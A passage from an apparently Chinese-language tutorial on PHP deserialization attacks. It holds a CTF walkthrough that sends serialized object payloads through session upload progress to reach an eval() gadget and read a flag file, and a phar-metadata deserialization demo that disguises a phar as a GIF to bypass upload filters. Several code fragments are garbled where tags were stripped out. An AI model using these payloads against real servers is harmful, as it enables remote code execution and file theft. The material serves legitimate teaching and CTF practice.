      $str = new D0g3();
      echo serialize($str);
     ?>
输出结果为
因为`session`是`php_serialize`处理器，所以允许`|`存在字符串中，所以将这段代码序列化内容前面加上`|`传入`session.php`中  
现在来看一下存入`session`文件的内容
再打开`hello.php`
## 一道CTF题:PHPINFO
题目链接：  
题目中给出如下代码
    mdzz = 'phpinfo();';
        }
        function __destruct()
        {
            eval($this->mdzz);
        }
    }
    if(isset($_GET['phpinfo']))
    {
        $m = new OowoO();
    }
    else
    {
        highlight_string(file_get_contents('index.php'));
    }
    ?>
仔细看了一遍发现题目没有入口，注意到`ini_set('session.serialize_handler',
'php')`，想到可不可能是`session`反序列化漏洞，看一下`phpinfo`,发现`session.serialize_handler`设置如下
    local value(当前目录，会覆盖master value内容):php
    master value(主目录，php.ini里面的内容):php_serialize
这个很明显就存在`php session`反序列化漏洞，但是入口点在哪里，怎么控制`session`的值  
在`phpinfo`里面看到了
    session.upload_progress.enabled on
    session.upload_progress.cleanup off
当一个上传在处理中，同时`POST`一个与`INI`中设置的`session.upload_progress.name`同名变量时，当`PHP`检测到这种`POST`请求时，它会在`$_SESSION`中添加一组数据。所以可以通过`Session
Upload Progress`来设置`session`  
允许上传且结束后不清除数据，这样更有利于利用  
在`html`网页源代码上面添加如下代码
接下来考虑如何利用
得到
为了防止转义，在每个双引号前加上`\`，即
    |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}
点击提交，`burpsuite`抓包将`filename`的值改为它
查询到当前目录有哪些文件了，在`phpinfo`里面查看到当前目录路径
于是我们利用
    print_r(file_get_contents("/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"));
来读取`Here_1s_7he_fl4g_buT_You_Cannot_see.php`中的内容，同样的道理加上`\`后将`filename`改为
    |O:5:\"OowoO\":1:{s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";}
得到`flag`
# phar拓展反序列化攻击面
## phar文件简介
### 概念
一个`php`应用程序往往是由多个文件构成的，如果能把他们集中为一个文件来分发和运行是很方便的，这样的列子有很多，比如在`window`操作系统上面的安装程序、一个`jquery`库等等，为了做到这点`php`采用了`phar`文档文件格式，这个概念源自`java`的`jar`，但是在设计时主要针对
PHP 的 Web 环境，与 `JAR` 归档不同的是`Phar`归档可由 `PHP`
本身处理，因此不需要使用额外的工具来创建或使用，使用`php`脚本就能创建或提取它。`phar`是一个合成词，由`PHP`和
`Archive`构成，可以看出它是`php`归档文件的意思(简单来说`phar`就是`php`压缩文档，不经过解压就能被 `php` 访问并执行)
### phar组成结构
    stub：它是phar的文件标识，格式为xxx;
    manifest：也就是meta-data，压缩文件的属性等信息，以序列化存储
    contents：压缩文件的内容
    signature：签名，放在文件末尾
这里有两个关键点，一是文件标识，必须以`__HALT_COMPILER();?>`结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者其它文件来绕过一些上传限制；二是反序列化，`phar`存储的`meta-data`信息以序列化方式存储，当文件操作函数通过`phar://`伪协议解析`phar`文件时就会将数据反序列化，而这样的文件操作函数有很多
### 前提条件
    php.ini中设置为phar.readonly=Off
    php version>=5.3.0
## phar反序列化漏洞
漏洞成因：`phar`存储的`meta-data`信息以序列化方式存储，当文件操作函数通过`phar://`伪协议解析`phar`文件时就会将数据反序列化
### demo测试
根据文件结构我们来自己构建一个`phar`文件，`php`内置了一个`Phar`类来处理相关操作
    startBuffering();
        $phar->setStub(""); //设置stub
        $o = new TestObject();
        $phar->setMetadata($o); //将自定义的meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
可以很明显看到`manifest`是以序列化形式存储的
有序列化数据必然会有反序列化操作，`php`一大部分的文件系统函数在通过`phar://`伪协议解析`phar`文件时，都会将`meta-data`进行反序列化  
在网上扒了一张图
用如下demo证明
当文件系统函数的参数可控时，我们可以在不调用`unserialize()`的情况下进行反序列化操作,极大的拓展了攻击面，其它函数也是可以的，比如`file_exists`函数,代码如下
### 将phar伪造成其他格式的文件
在前面分析`phar`的文件结构时可能会注意到，`php`识别`phar`文件是通过其文件头的`stub`，更确切一点来说是`__HALT_COMPILER();?>`这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将`phar`文件伪装成其他格式的文件
    startBuffering();
        $phar->setStub("GIF89a".""); //设置stub，增加gif文件头
        $o = new TestObject();
        $phar->setMetadata($o); //将自定义meta-data存入manifest
        $phar->addFromString("test.txt", "test"); //添加要压缩的文件
        //签名自动计算
        $phar->stopBuffering();
    ?>
采用这种方法可以绕过很大一部分上传检测
#### 利用条件
    phar文件需要上传到服务器端
    要有可用的魔术方法作为“跳板”
    文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤
#### 漏洞复现
upload.php  
白名单只允许上传`jpg,png,gif`
        文件上传
file_exists.php  
验证文件是否存在，漏洞利用点:`file_exists()`函数
     a);
        }
    }
    file_exists($filename);
    ?>
构造phar文件
     a);
        }
    }
    $phar = new Phar('phar.phar');
    $phar -> stopBuffering();
    $phar -> setStub('GIF89a'.'');
    $phar -> addFromString('test.txt','test');
    $object = new ghtwf01();
    $phar -> setMetadata($object);
    $phar -> stopBuffering();
    ?>
改后缀名为`gif`，然后上传，最后在`file_exists.php`利用漏洞
# 参考链接